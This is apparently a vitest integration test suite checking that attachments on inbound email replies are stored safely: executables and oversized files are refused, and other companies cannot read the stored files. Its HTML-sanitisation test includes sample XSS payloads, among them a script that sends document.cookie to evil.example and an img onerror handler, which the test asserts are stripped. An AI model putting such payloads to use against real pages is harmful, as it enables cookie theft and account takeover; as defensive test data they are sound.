import { describe, it, expect, beforeAll, afterAll } from "vitest";
import postgres from "postgres";
import { createHash, randomBytes } from "node:crypto";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { files as coreFiles, type Actor } from "@opentradesos/core";
import * as emailInbound from "../src/services/email-inbound";
import * as comms from "../src/services/comms";
import { svixSignature } from "../src/email/resend";
import "../src/email";
import { NotFoundError, type ServiceContext } from "../src/services/context";
import { seedOrg, testDb, fixtureId } from "./helpers";

/**
 * FILES THAT COME WITH AN EMAIL REPLY ARE KEPT, AND ONLY THE SAFE ONES (M18)
 *
 * A customer answers an invoice with a photograph of the boiler and the PDF of
 * their warranty. Resend posts the reply to the webhook, signed, naming the
 * files; the product fetches each one from Resend's received emails API and
 * keeps it in the company's own file store, attached to the message, where the
 * thread shows it and a download serves it to somebody who may read that
 * thread and nobody else.
 *
 * Written before the code, because each of these is somebody else's file
 * arriving on the company's server: an executable is never kept (and one that
 * says what it is by its name is never even downloaded), a file over the limit
 * is refused, a reply with too many files keeps the first ten, another
 * company cannot read one by knowing where it is, and a script in the email's
 * HTML is kept as nothing at all: the HTML is kept only as plain text.
 *
 * Resend is a local fake reached through the connection's `baseUrl`, which a
 * server obeys only with ALLOW_PROVIDER_BASE_URL set, as every provider fake
 * in this suite is.
 */
const url = process.env.DATABASE_URL;
if (!url && process.env.CI) {
  throw new Error("DATABASE_URL is not set. These tests must run in CI, not skip.");
}
const run = url ? describe : describe.skip;

const ORG = fixtureId("email-attachments:org");
const USER = fixtureId("email-attachments:user");
const OTHER_ORG = fixtureId("email-attachments:other-org");
const OTHER_USER = fixtureId("email-attachments:other-user");
const FROM = "office@attachments-co.example";
const DOMAIN = "replies.attachments-co.example";
const CUSTOMER = "pat@customer.example";
const TOKEN = "a".repeat(20) + randomBytes(12).toString("hex");
const SECRET = `whsec_${Buffer.from("resend-signing-key-for-attachments").toString("base64")}`;
const secrets: Record<string, string> = { RESEND_HOOK: SECRET, RESEND_KEY: "re_test_attachments" };
const readSecret = async (ref: string) => {
  const value = secrets[ref];
  if (!value) throw new Error(`no secret ${ref}`);
  return value;
};

let raw: postgres.Sql;
const db = () => testDb(url!);
const owner = (): ServiceContext => ({ actor: { userId: USER, organizationId: ORG, roles: ["owner"] as Actor["roles"] }, db: db() });
const stranger = (): ServiceContext => ({
  actor: { userId: OTHER_USER, organizationId: OTHER_ORG, roles: ["owner"] as Actor["roles"] }, db: db(),
});

/* ------------------------------------------------------------ the files */

const pdfBytes = (words: string) => Buffer.from(`%PDF-1.4\n% ${words}\n%%EOF\n`);
const pngBytes = (n: number) => Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.from(`picture number ${n} ${randomBytes(4).toString("hex")}`),
]);
/** A Windows program: the "MZ" every one of them starts with. */
const exeBytes = Buffer.concat([Buffer.from("MZ"), Buffer.alloc(200, 0x90)]);
const oversized = Buffer.concat([Buffer.from("%PDF-1.4\n"), Buffer.alloc(coreFiles.EMAIL_ATTACHMENTS.maxFileBytes + 1024, 0x20)]);

/* ----------------------------------------------------------- the fake Resend */

interface FakeFile { id: string; filename: string; contentType: string; bytes: Buffer; declaredSize?: number }
const held = new Map<string, FakeFile>();
const downloads: string[] = [];
const bodies = new Map<string, { text: string | null; html: string | null }>();
let server: Server;
let base = "";
const allowedBefore = process.env["ALLOW_PROVIDER_BASE_URL"];

function startFake(): Promise<void> {
  server = createServer((request, response) => {
    request.resume();
    request.on("end", () => {
      const reply = (status: number, json: unknown) => {
        response.writeHead(status, { "content-type": "application/json" });
        response.end(JSON.stringify(json));
      };
      const path = new URL(request.url ?? "/", "http://fake").pathname;
      const meta = /^\/emails\/receiving\/([^/]+)\/attachments\/([^/]+)$/.exec(path);
      if (meta) {
        const file = held.get(meta[2]!);
        if (!file || request.headers.authorization !== "Bearer re_test_attachments") { reply(404, { message: "Not found" }); return; }
        reply(200, {
          object: "attachment", id: file.id, filename: file.filename, content_type: file.contentType,
          size: file.declaredSize ?? file.bytes.length, download_url: `${base}/download/${file.id}`,
        });
        return;
      }
      const download = /^\/download\/([^/]+)$/.exec(path);
      if (download) {
        const file = held.get(download[1]!);
        if (!file) { reply(404, { message: "Not found" }); return; }
        downloads.push(file.id);
        response.writeHead(200, { "content-type": file.contentType });
        response.end(file.bytes);
        return;
      }
      const body = /^\/emails\/receiving\/([^/]+)$/.exec(path);
      if (body && bodies.has(body[1]!)) { reply(200, { ...bodies.get(body[1]!), headers: {} }); return; }
      reply(404, { message: `The fake has no ${request.method} ${path}` });
    });
  });
  return new Promise((resolve) => server.listen(0, "127.0.0.1", () => {
    base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    resolve();
  }));
}

let sequence = 0;
/** One reply, posted to the webhook as Resend posts it, signed. */
function post(emailId: string, data: Record<string, unknown>, attachments: FakeFile[] = []) {
  for (const file of attachments) held.set(file.id, file);
  const body = JSON.stringify({
    type: "email.received", created_at: new Date().toISOString(),
    data: {
      email_id: emailId, from: `Pat Customer <${CUSTOMER}>`, to: [`reply+${"t".repeat(32)}@${DOMAIN}`], subject: "Re: Your invoice",
      attachments: attachments.map((f) => ({ id: f.id, filename: f.filename, content_type: f.contentType })),
      ...data,
    },
  });
  sequence += 1;
  const id = `msg_att_${sequence}`;
  const timestamp = String(Math.floor(Date.now() / 1000));
  return emailInbound.receiveByToken(db(), {
    token: TOKEN,
    url: `https://ots.test/api/webhooks/email/${TOKEN}`,
    headers: { "svix-id": id, "svix-timestamp": timestamp, "svix-signature": `v1,${svixSignature(SECRET, id, timestamp, body)}` },
    rawBody: body,
  }, readSecret);
}

interface StoredMessage {
  id: string; conversation_id: string; body: string | null; body_html: string | null; html_text: string | null;
  media: { contentType: string; storageKey?: string; name?: string; refused?: string; bytes?: number }[];
}
const stored = async (emailId: string) => (await raw<StoredMessage[]>`
  select id, conversation_id, body, body_html, html_text, media from public.message
  where organization_id = ${ORG} and provider_message_id = ${emailId}`)[0]!;
const keptWithHash = async (bytes: Buffer) => raw`select 1 from public.stored_file
  where organization_id = ${ORG} and sha256 = ${createHash("sha256").update(bytes).digest("hex")} and deleted_at is null`;

beforeAll(async () => {
  if (!url) return;
  process.env["ALLOW_PROVIDER_BASE_URL"] = "1";
  await startFake();
  raw = postgres(url, { max: 1, onnotice: () => {} });
  await seedOrg(raw, { organizationId: ORG, userId: USER, name: "Attachments Co", slug: "email-attachments" });
  await seedOrg(raw, { organizationId: OTHER_ORG, userId: OTHER_USER, name: "Other Attachments Co", slug: "email-attachments-other" });
  await raw`insert into public.integration_connection (organization_id, capability, provider, status, credential_ref, settings)
            values (${ORG}, 'email', 'resend', 'connected', 'RESEND_KEY',
                    ${raw.json({ fromAddress: FROM, replyDomain: DOMAIN, webhookToken: TOKEN, webhookSecretRef: "RESEND_HOOK", baseUrl: base })})`;
});

afterAll(async () => {
  if (allowedBefore === undefined) delete process.env["ALLOW_PROVIDER_BASE_URL"];
  else process.env["ALLOW_PROVIDER_BASE_URL"] = allowedBefore;
  await new Promise<void>((resolve) => (server ? server.close(() => resolve()) : resolve()));
  if (raw) await raw.end();
});

run("files that come with a reply", () => {
  it("keeps a PDF and a photograph, attached to the message, and serves them to somebody who may read the thread", async () => {
    const warranty = pdfBytes("warranty for the boiler");
    const photo = pngBytes(1);
    const outcome = await post("in_kept", { text: "The warranty and a photo are attached." }, [
      { id: "att_pdf", filename: "Warranty card.pdf", contentType: "application/pdf", bytes: warranty },
      { id: "att_png", filename: "boiler.png", contentType: "image/png", bytes: photo },
    ]);
    expect(outcome).toMatchObject({ kind: "recorded", outcome: { kind: "message" } });

    const message = await stored("in_kept");
    expect(message.media).toHaveLength(2);
    const [pdfItem, pngItem] = message.media;
    expect(pdfItem).toMatchObject({ contentType: "application/pdf", name: "Warranty card.pdf", bytes: warranty.length });
    expect(pngItem).toMatchObject({ contentType: "image/png", name: "boiler.png" });
    expect(pdfItem!.storageKey).toMatch(/\.pdf$/);

    const attached = await raw<{ kind: string; file_name: string }[]>`select kind, file_name from public.attachment
      where organization_id = ${ORG} and entity_type = 'message' and entity_id = ${message.id} order by file_name`;
    expect(attached).toEqual([
      { kind: "email_attachment", file_name: "Warranty card.pdf" },
      { kind: "email_attachment", file_name: "boiler.png" },
    ]);

    const served = await comms.picture(owner(), { conversationId: message.conversation_id, storageKey: pdfItem!.storageKey! });
    expect(Buffer.from(served.bytes).equals(warranty)).toBe(true);
    expect(served.contentType).toBe("application/pdf");
    expect(served.name).toBe("Warranty card.pdf");
  });

  it("never keeps an executable: one named as a program is not even downloaded, and one dressed as a PDF is refused by its bytes", async () => {
    const before = downloads.length;
    await post("in_exe", { text: "Run this to pay." }, [
      { id: "att_exe", filename: "pay-now.exe", contentType: "application/x-msdownload", bytes: exeBytes },
      { id: "att_fake_pdf", filename: "invoice.pdf", contentType: "application/pdf", bytes: exeBytes },
    ]);
    const message = await stored("in_exe");
    expect(message.body).toBe("Run this to pay.");
    expect(downloads.slice(before)).toEqual(["att_fake_pdf"]);
    expect(message.media.every((m) => !m.storageKey)).toBe(true);
    expect(message.media[0]!.refused).toContain("pay-now.exe");
    expect(message.media[0]!.refused).toContain("program");
    expect(message.media[1]!.refused).toContain("invoice.pdf");
    expect(message.media[1]!.refused).toContain("program");
    expect(await keptWithHash(exeBytes)).toHaveLength(0);
    const attached = await raw`select 1 from public.attachment where organization_id = ${ORG} and entity_id = ${message.id}`;
    expect(attached).toHaveLength(0);
  });

  it("refuses a file over the size limit, and does not download one that says it is", async () => {
    const before = downloads.length;
    await post("in_big", { text: "Big files." }, [
      { id: "att_says_big", filename: "scan.pdf", contentType: "application/pdf", bytes: pdfBytes("small really"),
        declaredSize: coreFiles.EMAIL_ATTACHMENTS.maxFileBytes + 1 },
      { id: "att_is_big", filename: "plans.pdf", contentType: "application/pdf", bytes: oversized, declaredSize: 1000 },
    ]);
    const message = await stored("in_big");
    expect(downloads.slice(before)).toEqual(["att_is_big"]);
    expect(message.media.map((m) => m.storageKey ?? null)).toEqual([null, null]);
    expect(message.media[0]!.refused).toContain("scan.pdf");
    expect(message.media[0]!.refused).toContain("MB");
    expect(message.media[1]!.refused).toContain("plans.pdf");
    expect(await keptWithHash(oversized)).toHaveLength(0);
  });

  it("keeps the first ten files on one email and names the rest", async () => {
    const twelve = Array.from({ length: 12 }, (_, i) => ({
      id: `att_many_${i}`, filename: `photo-${i + 1}.png`, contentType: "image/png", bytes: pngBytes(100 + i),
    }));
    await post("in_many", { text: "Lots of photos." }, twelve);
    const message = await stored("in_many");
    expect(message.media.filter((m) => m.storageKey)).toHaveLength(coreFiles.EMAIL_ATTACHMENTS.maxFiles);
    const refused = message.media.filter((m) => m.refused);
    expect(refused).toHaveLength(2);
    expect(refused[0]!.refused).toContain("photo-11.png");
  });

  it("is not served to another company, or from a thread the file is not in", async () => {
    const message = await stored("in_kept");
    const key = message.media[0]!.storageKey!;
    await expect(comms.picture(stranger(), { conversationId: message.conversation_id, storageKey: key }))
      .rejects.toThrow(NotFoundError);
    // Somebody else writing in fresh is a thread of their own.
    await post("in_other_thread", { from: "lee@elsewhere.example", text: "Different person." },
      [{ id: "att_other", filename: "other.png", contentType: "image/png", bytes: pngBytes(999) }]);
    const other = await stored("in_other_thread");
    expect(other.conversation_id).not.toBe(message.conversation_id);
    await expect(comms.picture(owner(), { conversationId: other.conversation_id, storageKey: key }))
      .rejects.toThrow(NotFoundError);
    const nobody: ServiceContext = { actor: { userId: USER, organizationId: ORG, roles: [] }, db: db() };
    await expect(comms.picture(nobody, { conversationId: message.conversation_id, storageKey: key })).rejects.toThrow();
  });

  it("keeps the HTML only as plain text, so a script in it is kept as nothing", async () => {
    const html = "<html><head><style>p{color:red}</style><script>fetch('https://evil.example/'+document.cookie)</script></head>"
      + "<body><p>Thanks for <b>coming out</b>.</p><img src=x onerror=\"alert('x')\"><p>See you in spring.</p></body></html>";
    await post("in_html", { html });
    const message = await stored("in_html");
    expect(message.body_html).toBeNull();
    for (const kept of [message.body ?? "", message.html_text ?? ""]) {
      expect(kept).not.toContain("<");
      expect(kept).not.toContain("script");
      expect(kept).not.toContain("evil.example");
      expect(kept).not.toContain("onerror");
    }
    expect(message.body).toContain("Thanks for coming out.");
    expect(message.html_text).toContain("See you in spring.");

    // With a text part too, the words are the text part and the HTML is kept beside them as text.
    await post("in_both", { text: "Plain words.", html: "<p>Formatted <i>words</i>.</p><script>alert(1)</script>" });
    const both = await stored("in_both");
    expect(both.body).toBe("Plain words.");
    expect(both.html_text).toBe("Formatted words.");
    expect(both.body_html).toBeNull();
  });
});
